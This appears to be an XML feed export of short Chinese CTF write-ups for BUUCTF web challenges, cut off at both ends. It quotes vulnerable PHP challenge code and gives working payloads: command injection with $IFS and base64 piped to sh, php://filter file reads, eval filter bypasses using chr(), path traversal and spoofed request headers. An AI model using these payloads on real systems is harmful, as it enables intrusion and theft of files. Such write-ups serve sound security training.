punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token comment" spellcheck="true">//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"ping -c 4 "</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> ""<span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>可以看到过滤了字符</p><p>变量拼接</p><pre class=" language-php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>a<span class="token operator">=</span>g<span class="token punctuation">;</span>cat<span class="token variable">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span><span class="token punctuation">.</span>php<span class="token comment" spellcheck="true">//查看源代码可发现flag</span></code></pre><p>sh命令</p><pre class=" language-php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token variable">$IFS</span><span class="token variable">$9Y2F0IGZsYWcucGhwCg</span><span class="token operator">==</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">|</span><span class="token variable">$IFS</span><span class="token variable">$9base64</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">-</span>d<span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">|</span><span class="token variable">$IFS</span><span class="token variable">$9sh</span></code></pre><p>内联执行</p><pre class=" language-php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>cat<span class="token variable">$IFS</span><span class="token variable">$9</span>`ls`</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_新生赛 Include</title>
      <link href="2021/03/01/actf2020-xin-sheng-sai-include/"/>
      <url>2021/03/01/actf2020-xin-sheng-sai-include/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><pre class=" language-php"><code class="language-php">payload<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read/convert.base64-encode/resource=flag.php</span></code></pre><p>爆出加密后源代码后解密</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_新生赛 Exec</title>
      <link href="2021/03/01/actf2020-xin-sheng-sai-exec/"/>
      <url>2021/03/01/actf2020-xin-sheng-sai-exec/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><pre class=" language-php"><code class="language-php">payload<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>ls<span class="token comment" spellcheck="true">//只有一个index.php</span></code></pre><pre class=" language-php"><code class="language-php">payload<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>ls <span class="token operator">/</span> 返回上一级发现flag</code></pre><pre class=" language-php"><code class="language-php">最终payload<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>cat <span class="token operator">/</span>flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF_2019 Easy Calc</title>
      <link href="2021/03/01/roarctf-2019-easy-calc/"/>
      <url>2021/03/01/roarctf-2019-easy-calc/</url>
      
        <content type="html"><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源代码</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>I've <span class="token keyword">set</span> up WAF to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">            &lt;strong>答案:&lt;/strong>$&amp;#123;data&amp;#125;            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>进入<code>calc.php</code>得到</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>可以看到存在很多waf，eval执行函数</p><pre class=" language-php"><code class="language-php">payloadcalc<span class="token punctuation">.</span>php<span class="token operator">?</span> num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//扫描上级的文件</span>发现f1agg</code></pre><pre class=" language-php"><code class="language-php">payloadcalc<span class="token punctuation">.</span>php<span class="token operator">?</span> num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>得到flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018 WarmUp</title>
      <link href="2021/03/01/hctf-2018-warmup/"/>
      <url>2021/03/01/hctf-2018-warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>进去只有一张图片，查看源代码  发现<!--source.php--></p><p>进入source.php得到如下代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span><span class="token delimiter">?></span></code></pre><p>代码审计</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>传入一个’file’，满足不为空，是字符串，满足checkFile函数，就能被包含</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token comment" spellcheck="true">//不为空，是字符串的通过</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token comment" spellcheck="true">//检查是否在白名单</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//找到第一个'?'的索引</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//截取'?'前面的字符</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token comment" spellcheck="true">//检查截取后是否在白名单</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//url解码</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>分析后得到函数功能  只需要满足一个ture就能进入包含文件</p><p>进入hint.php  得到提示flag not here, and flag in ffffllllaaaagggg</p><p>猜测是目录遍历</p><p>这里构造payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>hint<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg或者<span class="token operator">/</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>hint<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token constant">253F</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg</code></pre><p>成功了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Http</title>
      <link href="2021/03/01/ji-ke-da-tiao-zhan-2019-http/"/>
      <url>2021/03/01/ji-ke-da-tiao-zhan-2019-http/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>检查源码，发现<code>Secret.php</code></p><p>进入<code>Secret.php</code></p><pre class=" language-php"><code class="language-php">It doesn<span class="token string">'t come from '</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.Sycsecret.com'提示</span></code></pre><p>burp抓包修改Referer</p><pre class=" language-php"><code class="language-php">Referer<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.Sycsecret.com</span></code></pre><pre class=" language-php"><code class="language-php">提示Please <span class="token keyword">use</span> <span class="token string">"Syclover"</span> brows</code></pre><p>修改UA</p><pre class=" language-php"><code class="language-php">User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Syclover</code></pre><pre class=" language-php"><code class="language-php">提示No<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span> you can only read this locally<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span></code></pre><p>修改XFF</p><pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span></code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Havefun</title>
      <link href="2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
